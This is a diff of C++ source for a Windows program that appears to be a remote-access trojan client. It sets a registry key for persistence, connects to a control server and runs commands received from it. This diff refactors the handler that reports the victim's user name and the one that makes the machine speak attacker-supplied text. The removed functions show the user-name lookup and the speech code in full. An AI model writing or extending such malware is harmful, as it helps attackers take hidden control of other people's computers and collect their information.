@@ -1,8 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
 #define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
-
-#include <sapi.h>
 #include "client.h"
 #include "main.h"
 #include "persistence.h"
@@ -21,6 +19,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int n
 	{
 		client.SetRegKey();
 	}
+
 	client.connect_to_server();
 	string command;
 	while(true)
@@ -55,35 +54,10 @@ void handle_command(CLIENT& client, string& command)
 	}
 	else if(command == "username")
 	{
-		send_username(client);
+		client.send_username();
 	}
 	else if(command.substr(0,6) == "speak ")
 	{ 
-		speak_command(command);
+		client.speak_command(command.substr((size_t)6));
 	}
-}
-
-void send_username(CLIENT& client) 
-{
-	char *uname = new char[500];
-	DWORD user_len = 500;
-	GetUserNameA(uname, &user_len);
-	string resp;
-	resp.assign(uname);
-	client.send_response(resp);
-	delete[] uname;
-}
-
-void speak_command(string& command)
-{
-	ISpVoice * pVoice = NULL;
-	CoInitialize(NULL);
-	HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void **)&pVoice);
-	const char* to_speak_char = command.c_str() + 6;
-	wchar_t* to_speak_unicode = new wchar_t[command.length()];
-	MultiByteToWideChar(CP_UTF8, 0, to_speak_char, -1, to_speak_unicode, command.length());
-	pVoice->SetVolume(100);
-	hr = pVoice->Speak(to_speak_unicode, NULL, NULL);
-	pVoice->Release();
-	CoUninitialize();
 }
